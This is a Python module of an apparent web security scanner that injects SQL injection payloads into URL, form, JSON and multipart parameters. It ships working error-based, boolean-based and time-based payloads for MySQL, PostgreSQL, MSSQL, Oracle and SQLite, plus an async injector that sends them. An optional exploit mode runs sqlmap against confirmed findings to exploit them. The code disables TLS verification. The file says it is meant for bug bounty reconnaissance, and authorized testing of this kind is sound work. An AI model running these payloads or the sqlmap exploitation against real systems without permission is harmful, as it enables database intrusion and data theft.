from __future__ import annotations

import asyncio
import json
import re
import subprocess
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode

import httpx

from config.settings import HTTP_TIMEOUT, MAX_THREADS, OUTPUT_DIR
from core.logger import get_logger, section
from modules.host_probe import ProbeResult
from modules.param_discovery import ParamScanResult

log = get_logger()

OUTPUT_PATH = Path(OUTPUT_DIR) / "sqli"

# CONSTANTS
PREFILTER_CONCURRENCY: int = min(MAX_THREADS, 20)
DETECTION_CONCURRENCY: int = 8
CONFIDENCE_THRESHOLD: float = 0.35
MAX_TARGETS: int = 30
MAX_RETRIES: int = 2
RETRY_BACKOFF_S: float = 1.5
TIME_MULTIPLIER: float = 3.0
TIME_FLOOR_S: float = 3.0
BASELINE_SAMPLES: int = 3
SIMILARITY_THRESHOLD: float = 0.85

# Native Python types a JSON API parameter might carry
ParamValue = str | int | float | bool | list | None

# Database Error Signatures
_DB_ERRORS: tuple[tuple[re.Pattern, str, int], ...] = (
    (re.compile(r"SQL syntax.*MySQL|MySQL.*SQL syntax", re.I), "MySQL", 3),
    (re.compile(r"Warning.*?(mysql_|mysqli_|PDO)", re.I), "MySQL", 3),
    (re.compile(r"MySQLSyntaxErrorException", re.I), "MySQL", 3),
    (re.compile(r"check the manual that corresponds to your MySQL", re.I), "MySQL", 3),
    (re.compile(r"com\.mysql\.jdbc\.exceptions", re.I), "MySQL", 2),
    (re.compile(r"PostgreSQL.*ERROR|ERROR.*PostgreSQL", re.I), "PostgreSQL", 3),
    (re.compile(r"org\.postgresql\.util\.PSQLException", re.I), "PostgreSQL", 3),
    (re.compile(r"PG::SyntaxError:|pg_query\(\):", re.I), "PostgreSQL", 2),
    (re.compile(r"column .* does not exist", re.I), "PostgreSQL", 2),
    (re.compile(r"Microsoft OLE DB Provider for SQL Server", re.I), "MSSQL", 3),
    (re.compile(r"Unclosed quotation mark after the character string", re.I), "MSSQL", 3),
    (re.compile(r"Incorrect syntax near", re.I), "MSSQL", 2),
    (re.compile(r"Microsoft SQL Native Client.*error", re.I), "MSSQL", 3),
    (re.compile(r"mssql_query\(\)|sqlsrv_query\(\)", re.I), "MSSQL", 2),
    (re.compile(r"ORA-\d{5}:", re.I), "Oracle", 3),
    (re.compile(r"Oracle error|Oracle.*Driver", re.I), "Oracle", 2),
    (re.compile(r"quoted string not properly terminated", re.I), "Oracle", 2),
    (re.compile(r"SQLite/JDBCDriver|SQLite\.Exception|SQLITE_ERROR", re.I), "SQLite", 3),
    (re.compile(r"System\.Data\.SQLite\.SQLiteException", re.I), "SQLite", 3),
    (re.compile(r"DB2 SQL error|db2_\w+\(\)", re.I), "DB2", 3),
    (re.compile(r"Sybase.*Server message|sybase.*error", re.I), "Sybase", 2),
    (re.compile(r"Dynamic SQL Error|ibase_query\(\)", re.I), "Firebird", 3),
    (re.compile(r"You have an error in your SQL", re.I), "Generic", 2),
    (re.compile(r"supplied argument is not a valid.*result", re.I), "Generic", 1)
)

_ERROR_PAYLOADS: tuple[str, ...] = (
    "'",
    "''",
    "`",
    "\\",
    '"',
    "1'",
    "1\"",
    "'/**/",
    "'%09",
    "'%0a",
    "/*!50000'*/",
    "1 AND 1=CONVERT(int,(SELECT @@version))",
    "1 AND extractvalue(1,concat(0x7e,(SELECT version())))"
)

_BOOLEAN_PAIRS: tuple[tuple[str, str], ...] = (
    ("1 AND 1=1--", "1 AND 1=2--"),
    ("1 AND 1=1#", "1 AND 1=2#"),
    ("1' AND '1'='1'--", "1' AND '1'='2'--"),
    ("1 AND (SELECT 1)=1--", "1 AND (SELECT 2)=1--"),
    ("1/**/AND/**/1=1", "1/**/AND/**/1=2")
)

_TIME_PAYLOADS: dict[str, tuple[str, ...]] = {
    "MySQL": ("1 AND SLEEP(5)--", "1' AND SLEEP(5)--", "1/**/AND/**/SLEEP(5)"),
    "PostgreSQL": ("1;SELECT pg_sleep(5)--", "1' AND (SELECT 1 FROM pg_sleep(5))='1"),
    "MSSQL": ("1;WAITFOR DELAY '0:0:5'--", "1' WAITFOR DELAY '0:0:5'--"),
    "Oracle": ("1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)--",),
    "SQLite": ("1 AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))--",),
    "Generic": ("1 AND SLEEP(5)--", "1;SELECT SLEEP(5)--")
}

_HIGH_RISK_PARAMS: frozenset[str] = frozenset({
    "id", "user_id", "uid", 
    "item_id", "product_id", "order_id",
    "category", "page", "cat", 
    "article", "news_id", "record",
    "num", "key", "primary", 
    "ref", "pid", "cid", "tid"
})

# CONTENT TYPE
class ContentType(str, Enum):
    FORM = "form"
    JSON = "json"
    MULTIPART = "multipart"

def _detect_content_type(url: str, response_headers: dict[str, str]) -> ContentType:
    """
    Detects POST content type.
    Priority: response Content-Type header → URL path heuristic → form default.
    """
    ct = response_headers.get("content-type", "").lower()
    if "application/json" in ct:
        return ContentType.JSON
    if "multipart/form-data" in ct:
        return ContentType.MULTIPART
    if "application/x-www-form-urlencoded" in ct:
        return ContentType.FORM

    path = urlparse(url).path.lower()
    if any(s in path for s in ("/api/", "/v1/", "/v2/", "/v3/", "/graphql", "/rest/")):
        return ContentType.JSON

    return ContentType.FORM

# DATA MODELS
class SQLiTechnique(str, Enum):
    ERROR_BASED = "error_based"
    BOOLEAN_BASED = "boolean_based"
    TIME_BASED = "time_based"


class SQLiSeverity(str, Enum):
    CRITICAL = "CRITICAL"
    HIGH  = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"


@dataclass
class ScanTarget:
    """
    One (url, parameter, method) combination ready for testing.
    Carries content_type, cached base_params, baseline response,
    and baseline avg elapsed — computed once in pre-filter, reused in detection.
    """
    url: str
    parameter: str
    method: str
    content_type: ContentType
    base_params: dict[str, list[str]]
    score: float = 0.0
    reasons: list[str] = field(default_factory=list)
    db_hint: str | None = None
    baseline_resp: httpx.Response | None = field(default=None, repr=False)
    baseline_avg: float = 0.0

    @property
    def passes(self) -> bool:
        return self.score >= CONFIDENCE_THRESHOLD

    def flat_params(self) -> dict[str, str]:
        """Flatten base_params — first value per key, preserve strings."""
        return {k: v[0] if v else "" for k, v in self.base_params.items()}
    

@dataclass
class SQLiFinding:
    url: str
    parameter: str
    method: str
    technique: SQLiTechnique
    severity: SQLiSeverity
    database: str | None
    evidence: str
    payload: str
    sqlmap_data: str | None = None

    def to_dict(self) -> dict:
        return {
            "url": self.url,
            "parameter": self.parameter,
            "method": self.method,
            "technique": self.technique.value,
            "severity": self.severity.value,
            "database": self.database,
            "evidence": self.evidence[:600],
            "payload": self.payload,
            "sqlmap_data": self.sqlmap_data,
        }
    
@dataclass
class SQLiScanResult:
    target:   str
    findings: list[SQLiFinding] = field(default_factory=list)

    @property
    def critical_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == SQLiSeverity.CRITICAL)

    @property
    def confirmed_dbs(self) -> set[str]:
        return {f.database for f in self.findings if f.database}

    def to_dict(self) -> dict:
        return {
            "target": self.target,
            "total_findings": len(self.findings),
            "critical": self.critical_count,
            "databases": sorted(self.confirmed_dbs),
            "findings": [f.to_dict() for f in self.findings],
        }


# SIMILARITY ENGINE — TYPE-AWARE

def _compute_similarity(body_a: str, body_b: str) -> float:
    """
    Computes structural similarity between two responses.
    Detects response type first — then applies the right algorithm:

    JSON response  → key-set Jaccard on top-level keys.
                     Handles modern API responses correctly.
    HTML response  → tag bigram Jaccard — stable across content changes.
    Plain text     → normalized length ratio — simple and reliable.

    Returns 0.0 (completely different) to 1.0 (identical structure).
    """
    body_a = body_a.strip()
    body_b = body_b.strip()

    if not body_a or not body_b:
        return 1.0 if body_a == body_b else 0.0

    # JSON path
    if body_a.startswith(("{", "[")):
        try:
            data_a = json.loads(body_a)
            data_b = json.loads(body_b)

            def _key_set(obj: Any) -> set[str]:
                """Recursively extract all JSON keys."""
                keys: set[str] = set()
                if isinstance(obj, dict):
                    for k, v in obj.items():
                        keys.add(k)
                        keys |= _key_set(v)
                elif isinstance(obj, list):
                    for item in obj:
                        keys |= _key_set(item)
                return keys

            keys_a = _key_set(data_a)
            keys_b = _key_set(data_b)

            if not keys_a and not keys_b:
                return 1.0

            union        = keys_a | keys_b
            intersection = keys_a & keys_b
            return len(intersection) / len(union) if union else 1.0

        except (json.JSONDecodeError, ValueError):
            pass  # Not valid JSON — fall through to HTML/text

    # HTML path
    if "<" in body_a and ">" in body_a:
        tags_a = re.findall(r"</?(\w+)", body_a)
        tags_b = re.findall(r"</?(\w+)", body_b)

        def _bigrams(tags: list[str]) -> set[tuple[str, str]]:
            return {(tags[i], tags[i + 1]) for i in range(len(tags) - 1)}

        bg_a = _bigrams(tags_a)
        bg_b = _bigrams(tags_b)

        if not bg_a and not bg_b:
            return 1.0

        union        = bg_a | bg_b
        intersection = bg_a & bg_b
        return len(intersection) / len(union) if union else 1.0

    # Plain text path
    max_len = max(len(body_a), len(body_b))
    if max_len == 0:
        return 1.0
    return 1.0 - abs(len(body_a) - len(body_b)) / max_len


# HTTP INJECTOR
async def _inject(
    client:       httpx.AsyncClient,
    target:       ScanTarget,
    value:        str,
) -> tuple[httpx.Response | None, float]:
    """
    Injects value into target.parameter.
    GET: rewrites query string.
    POST form: application/x-www-form-urlencoded with string values.
    POST JSON: application/json — coerces value to native type when possible.
    POST multipart: files dict.

    Returns (response | None, elapsed_monotonic_seconds).
    """
    merged_str: dict[str, str] = target.flat_params()
    merged_str[target.parameter] = value

    for attempt in range(MAX_RETRIES):
        t_start = time.monotonic()
        try:
            resp = await _send_request(client, target, value, merged_str)
            elapsed = time.monotonic() - t_start

            if resp.status_code == 429:
                wait = RETRY_BACKOFF_S ** (attempt + 1)
                log.warning(f"[SQLi] 429 on {target.url} — backing off {wait:.1f}s")
                await asyncio.sleep(wait)
                continue

            return resp, elapsed

        except httpx.TimeoutException:
            elapsed = time.monotonic() - t_start
            if attempt < MAX_RETRIES - 1:
                await asyncio.sleep(RETRY_BACKOFF_S ** attempt)
            else:
                return None, elapsed
        except httpx.RequestError as exc:
            log.warning(f"[SQLi] Request error {target.url}: {type(exc).__name__}")
            return None, 0.0

    return None, 0.0


async def _send_request(
    client:     httpx.AsyncClient,
    target:     ScanTarget,
    value:      str,
    merged_str: dict[str, str],
) -> httpx.Response:
    """
    Dispatches the actual HTTP request based on method + content type.
    Separated from retry logic for clarity.
    """
    if target.method.upper() == "GET":
        parsed  = urlparse(target.url)
        new_url = parsed._replace(query=urlencode(merged_str)).geturl()
        return await client.get(new_url)

    if target.content_type == ContentType.JSON:
        # Coerce injected value to native type when possible — preserves API semantics
        merged_native: dict[str, ParamValue] = dict(merged_str)
        try:
            orig = target.base_params.get(target.parameter, [""])[0]
            if orig.isdigit():
                merged_native[target.parameter] = int(value) if value.isdigit() else value
            elif orig.lower() in ("true", "false"):
                merged_native[target.parameter] = value.lower() == "true"
        except (ValueError, AttributeError):
            pass

        return await client.post(
            target.url,
            json=merged_native,
            headers={"Content-Type": "application/json"},
        )

    if target.content_type == ContentType.MULTIPART:
        return await client.post(
            target.url,
            files={k: (None, v) for k, v in merged_str.items()},
        )

    # Default: form-encoded
    return await client.post(target.url, data=merged_str)



# BASELINE MEASURER
async def _measure_baseline(
    client: httpx.AsyncClient,
    target: ScanTarget,
) -> tuple[httpx.Response | None, float]:
    """
    Fires BASELINE_SAMPLES benign requests.
    Returns (last_response, mean_elapsed).
    Uses original parameter value or safe default.
    """
    orig_value    = target.base_params.get(target.parameter, ["1"])[0] or "1"
    safe_value    = orig_value if orig_value.strip() else ("1" if True else "test")
    elapsed_list: list[float] = []
    last_resp:    httpx.Response | None = None

    for _ in range(BASELINE_SAMPLES):
        resp, elapsed = await _inject(client, target, safe_value)
        if resp is not None:
            elapsed_list.append(elapsed)
            last_resp = resp

    mean_elapsed = (
        sum(elapsed_list) / len(elapsed_list)
        if elapsed_list else float(HTTP_TIMEOUT)
    )
    return last_resp, mean_elapsed


# DB ERROR CHECKER
def _check_db_errors(body: str) -> tuple[str | None, int, str]:
    """Returns (db_name | None, weight, evidence_snippet)."""
    for pattern, db_name, weight in _DB_ERRORS:
        match = pattern.search(body)
        if match:
            idx      = match.start()
            evidence = body[max(0, idx - 60): min(len(body), idx + 140)].strip()
            return db_name, weight, evidence
    return None, 0, ""


# DETECTION: ERROR-BASED
async def _detect_error(
    client: httpx.AsyncClient,
    target: ScanTarget,
) -> SQLiFinding | None:
    for payload in _ERROR_PAYLOADS:
        resp, _ = await _inject(client, target, payload)
        if resp is None:
            continue

        db_name, weight, evidence = _check_db_errors(resp.text)
        if not db_name:
            continue

        severity = SQLiSeverity.HIGH if weight >= 3 else SQLiSeverity.MEDIUM
        log.warning(
            f"[SQLi] ★ ERROR [{severity.value}] ?{target.parameter} → {target.url}\n"
            f"       DB={db_name} | {evidence[:100]}"
        )
        return SQLiFinding(
            url=target.url, parameter=target.parameter, method=target.method,
            technique=SQLiTechnique.ERROR_BASED, severity=severity,
            database=db_name, evidence=evidence, payload=payload,
        )
    return None


# DETECTION: BOOLEAN-BASED
async def _detect_boolean(
    client:   httpx.AsyncClient,
    target:   ScanTarget,
    baseline: httpx.Response,
) -> SQLiFinding | None:
    for true_payload, false_payload in _BOOLEAN_PAIRS:
        true_resp,  _ = await _inject(client, target, true_payload)
        false_resp, _ = await _inject(client, target, false_payload)

        if true_resp is None or false_resp is None:
            continue

        sim_true_base  = _compute_similarity(baseline.text, true_resp.text)
        sim_true_false = _compute_similarity(true_resp.text, false_resp.text)

        if (
            sim_true_base  >= SIMILARITY_THRESHOLD
            and sim_true_false < SIMILARITY_THRESHOLD
        ):
            evidence = (
                f"True↔Baseline={sim_true_base:.1%} | "
                f"True↔False={sim_true_false:.1%}"
            )
            log.warning(
                f"[SQLi] ★ BOOLEAN [MEDIUM] ?{target.parameter} → {target.url}\n"
                f"       {evidence}"
            )
            return SQLiFinding(
                url=target.url, parameter=target.parameter, method=target.method,
                technique=SQLiTechnique.BOOLEAN_BASED, severity=SQLiSeverity.MEDIUM,
                database=None, evidence=evidence,
                payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
            )
    return None


# DETECTION: TIME-BASED
async def _detect_time(
    client: httpx.AsyncClient,
    target: ScanTarget,
) -> SQLiFinding | None:
    """
    Dynamic threshold = max(TIME_FLOOR_S, baseline_avg × TIME_MULTIPLIER).
    DB-hinted payloads fire first — one Generic fallback per unknown DB.
    """
    threshold = max(TIME_FLOOR_S, target.baseline_avg * TIME_MULTIPLIER)

    ordered: list[tuple[str, str]] = []
    if target.db_hint and target.db_hint in _TIME_PAYLOADS:
        ordered.extend(
            (target.db_hint, p) for p in _TIME_PAYLOADS[target.db_hint]
        )
    for db_name, payloads in _TIME_PAYLOADS.items():
        if db_name != target.db_hint:
            ordered.append((db_name, payloads[0]))

    for db_name, payload in ordered:
        resp, elapsed = await _inject(client, target, payload)
        if resp is None:
            continue

        if elapsed >= threshold:
            evidence = (
                f"Elapsed={elapsed:.2f}s | "
                f"Baseline={target.baseline_avg:.2f}s | "
                f"Threshold={threshold:.2f}s"
            )
            log.warning(
                f"[SQLi] ★ TIME [{SQLiSeverity.HIGH.value}] "
                f"?{target.parameter} → {target.url}\n"
                f"       DB={db_name} | {evidence}"
            )
            return SQLiFinding(
                url=target.url, parameter=target.parameter, method=target.method,
                technique=SQLiTechnique.TIME_BASED, severity=SQLiSeverity.HIGH,
                database=db_name, evidence=evidence, payload=payload,
            )
    return None



# PRE-FILTER
async def _prefilter(
    client: httpx.AsyncClient,
    target: ScanTarget,
    sem:    asyncio.Semaphore,
) -> ScanTarget:
    """
    Scores target by SQLi likelihood.
    Measures baseline once — stored on target for reuse in detection.
    Score contributors:
      Numeric value     → +0.35
      High-risk name    → +0.20
      Short value ≤3    → +0.10
      DB error on quote → +0.50 (weight≥3) | +0.30 (weight<3)
      Structural diff   → +0.25
    """
    current_value = target.base_params.get(target.parameter, [""])[0] or ""

    if current_value.isdigit():
        target.score += 0.35
        target.reasons.append("numeric(+0.35)")

    if target.parameter.lower() in _HIGH_RISK_PARAMS:
        target.score += 0.20
        target.reasons.append("high_risk_name(+0.20)")

    if 0 < len(current_value) <= 3:
        target.score += 0.10
        target.reasons.append("short_value(+0.10)")

    async with sem:
        baseline_resp, baseline_avg = await _measure_baseline(client, target)

        # Store on target — detection phase reuses without extra requests
        target.baseline_resp = baseline_resp
        target.baseline_avg  = baseline_avg

        quote_resp, _ = await _inject(client, target, "'")
        if quote_resp is not None:
            db_name, weight, _ = _check_db_errors(quote_resp.text)
            if db_name:
                bonus = 0.50 if weight >= 3 else 0.30
                target.score   += bonus
                target.db_hint  = db_name
                target.reasons.append(f"db_error({db_name},+{bonus})")

            if baseline_resp is not None:
                sim = _compute_similarity(baseline_resp.text, quote_resp.text)
                if sim < SIMILARITY_THRESHOLD:
                    target.score += 0.25
                    target.reasons.append(f"struct_diff({sim:.0%},+0.25)")

    target.score = min(target.score, 1.0)
    return target



# OPTIONAL SQLMAP
def _run_sqlmap(target: ScanTarget, db_hint: str | None) -> str | None:
    """
    SQLMap for deep exploitation — stdout captured directly.
    Only called when exploit_mode=True.
    POST method passes --data flag with form-encoded params.
    """
    from shutil import which
    if not which("sqlmap"):
        log.error("[SQLMap] Binary not found")
        return None

    _DB_FLAGS: dict[str, str] = {
        "MySQL": "mysql", "PostgreSQL": "postgresql", "MSSQL": "mssql",
        "Oracle": "oracle", "SQLite": "sqlite", "DB2": "db2",
    }

    cmd: list[str] = [
        "sqlmap",
        f"--url={target.url}",
        f"--param={target.parameter}",
        f"--method={target.method.upper()}",
        "--batch",
        "--random-agent",
        "--level=3",
        "--risk=2",
        "--threads=5",
        f"--timeout={HTTP_TIMEOUT}",
        "--technique=EUBTS",
        "--flush-session",
    ]

    if target.method.upper() == "POST":
        # Provide POST body so SQLMap tests the right vector
        post_body = urlencode(target.flat_params())
        cmd.append(f"--data={post_body}")

    if db_hint and db_hint in _DB_FLAGS:
        cmd.append(f"--dbms={_DB_FLAGS[db_hint]}")

    log.info(f"[SQLMap] Exploiting ?{target.parameter} on {target.url}")

    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=300,
            encoding="utf-8",
            check=False,
        )
        return proc.stdout.strip() or None
    except subprocess.TimeoutExpired:
        log.warning("[SQLMap] Timed out after 300s")
        return None
    except FileNotFoundError:
        log.error("[SQLMap] Binary not found")
        return None


# FULL PARAMETER TEST
async def _test_target(
    client:       httpx.AsyncClient,
    target:       ScanTarget,
    sem:          asyncio.Semaphore,
    exploit_mode: bool,
) -> SQLiFinding | None:
    """
    Three-phase cascade: error → boolean → time.
    Baseline and db_hint already on target from pre-filter — no re-fetch.
    Stops at first confirmed finding.
    """
    async with sem:
        finding = await _detect_error(client, target)

        if finding is None and target.baseline_resp is not None:
            finding = await _detect_boolean(client, target, target.baseline_resp)

        if finding is None:
            finding = await _detect_time(client, target)

    if finding is None:
        return None

    if exploit_mode:
        sqlmap_out = await asyncio.get_event_loop().run_in_executor(
            None, _run_sqlmap, target, finding.database
        )
        if sqlmap_out:
            finding.sqlmap_data = sqlmap_out[:3000]
            finding.severity    = SQLiSeverity.CRITICAL
            log.warning(
                f"[SQLMap] ★ CRITICAL — Exploitation confirmed: "
                f"{target.url} ?{target.parameter}"
            )

    return finding


# TARGET BUILDER
def _build_targets(
    probe_result: ProbeResult,
    param_result: ParamScanResult,
) -> list[ScanTarget]:
    """
    Builds deduplicated ScanTarget list.
    Sources: Arjun param results (Step 13) + live host query params (Step 7).
    Numeric params sorted first — highest SQLi yield.
    """
    seen:    set[str]        = set()
    targets: list[ScanTarget] = []

    def _add(url: str, param: str, method: str) -> None:
        key = f"{url}:{param}:{method.upper()}"
        if key in seen:
            return
        seen.add(key)
        base_params  = parse_qs(urlparse(url).query, keep_blank_values=True)
        content_type = _detect_content_type(url, {})
        targets.append(ScanTarget(
            url=url,
            parameter=param,
            method=method,
            content_type=content_type,
            base_params=base_params,
        ))

    for url_result in param_result.url_results:
        for param in url_result.params:
            _add(url_result.url, param.param_name, url_result.method)

    for host in probe_result.live_hosts:
        parsed = urlparse(host.url)
        for param_name in parse_qs(parsed.query, keep_blank_values=True).keys():
            _add(host.url, param_name, "GET")

    # Numeric params first — highest SQLi probability
    targets.sort(
        key=lambda t: t.base_params.get(t.parameter, [""])[0].isdigit(),
        reverse=True,
    )
    return targets


# SAVE RESULTS
def _save_results(result: SQLiScanResult) -> Path:
    OUTPUT_PATH.mkdir(parents=True, exist_ok=True)
    safe      = result.target.replace(".", "_")
    out_file  = OUTPUT_PATH / f"{safe}_sqli.json"
    with out_file.open("w", encoding="utf-8") as f:
        json.dump(result.to_dict(), f, indent=2)
    log.info(f"[SQLi] Results saved → {out_file}")
    return out_file


# ASYNC ORCHESTRATOR
async def _run_sqli_scan(
    probe_result: ProbeResult,
    param_result: ParamScanResult,
    exploit_mode: bool,
) -> SQLiScanResult:
    result     = SQLiScanResult(target=probe_result.target)
    filter_sem = asyncio.Semaphore(PREFILTER_CONCURRENCY)
    detect_sem = asyncio.Semaphore(DETECTION_CONCURRENCY)
    timeout = httpx.Timeout(connect=5.0, read=float(HTTP_TIMEOUT), write=5.0, pool=5.0)

    async with httpx.AsyncClient(
        timeout=timeout,
        verify=False,
        follow_redirects=True,
        headers={"User-Agent": "Mozilla/5.0 (compatible; PHANTOM-Scanner/1.0)"},
    ) as client:
        raw_targets = _build_targets(probe_result, param_result)
        if not raw_targets:
            log.warning("[SQLi] No parameters to test — skipping")
            return result

        log.info(f"[SQLi] Pre-filtering {len(raw_targets)} parameter(s)")

        # ── Pre-filter: concurrent scoring + baseline measurement ──
        scored: list[ScanTarget] = await asyncio.gather(
            *[_prefilter(client, t, filter_sem) for t in raw_targets],
            return_exceptions=False,
        )

        passing = sorted(
            (t for t in scored if t.passes),
            key=lambda t: t.score,
            reverse=True,
        )[:MAX_TARGETS]

        log.info(
            f"[SQLi] Pre-filter: {len(passing)}/{len(scored)} passed "
            f"threshold={CONFIDENCE_THRESHOLD}"
        )
        for t in passing:
            log.info(
                f"[SQLi]   {t.score:.2f} | ?{t.parameter} | "
                f"DB={t.db_hint or '?'} | {', '.join(t.reasons)}"
            )

        if not passing:
            log.info("[SQLi] No parameters passed pre-filter")
            return result

        # Detection: cascade per passing target
        findings: list[SQLiFinding | None] = await asyncio.gather(
            *[_test_target(client, t, detect_sem, exploit_mode) for t in passing],
            return_exceptions=False,
        )
        result.findings = [f for f in findings if f is not None]

    return result


# MAIN ENTRY POINT

def scan_sqli(
    probe_result: ProbeResult,
    param_result: ParamScanResult,
    exploit_mode: bool = False,
) -> SQLiScanResult:
    """
    Three-phase SQLi scanner — pre-filter → error → boolean → time.
    exploit_mode=False: detection only (fast, safe for bug bounty recon).
    exploit_mode=True:  SQLMap exploitation on confirmed findings.
    """
    section(f"SQLi Scanner → {probe_result.target}")

    if not probe_result.live_hosts:
        log.warning("[SQLi] No live hosts — skipping")
        return SQLiScanResult(target=probe_result.target)

    if exploit_mode:
        log.warning("[SQLi] EXPLOIT MODE — SQLMap will run on confirmed findings")

    result = asyncio.run(_run_sqli_scan(probe_result, param_result, exploit_mode))

    log.info(f"[SQLi] Findings:  {len(result.findings)}")
    log.info(f"[SQLi] Critical:  {result.critical_count}")
    log.info(f"[SQLi] Databases: {sorted(result.confirmed_dbs)}")

    if result.findings:
        log.warning("[SQLi] ★ FINDINGS:")
        for f in result.findings:
            log.warning(
                f"  [{f.severity.value}] [{f.technique.value}] "
                f"?{f.parameter} — {f.url} | DB={f.database or '?'}"
            )

    _save_results(result)
    return result